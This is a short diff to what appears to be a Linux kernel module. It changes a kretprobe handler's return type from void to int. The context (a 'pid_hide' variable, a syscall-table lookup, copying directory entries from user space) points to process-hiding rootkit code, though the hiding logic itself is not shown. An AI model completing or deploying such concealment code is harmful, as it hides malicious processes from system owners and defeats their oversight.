@@ -52,7 +52,7 @@ unsigned long *get_syscall_table(void)
 
 int pid_hide = 0;
 
-static void handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
+static int handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 // struct kprobe *p, struct pt_regs *regs, unsigned long flags)
 {
     uint64_t v4;
@@ -72,12 +72,12 @@ static void handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 		wuwa_info("bsdkkk - ret %d, pid %d", ret, pid_hide);
 		int err = 0;
 
-		if(ret <= 0) return;
+		if(ret <= 0) return 0;
 		    
 		kdirent = kzalloc(ret, GFP_KERNEL);
 
 	    if (kdirent == NULL)
-		    return;
+		    return 0;
 
 	    // Copying directory name (or pid name) from userspace to kernel space
 	    err = copy_from_user(kdirent, dirent, ret);
@@ -129,9 +129,9 @@ static void handler_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 */		
 	out:
 	    kfree(kdirent);
-	    return;
+	    return 0;
 	}
-	return;
+	return 0;
 }
 
 struct prctl_cf {
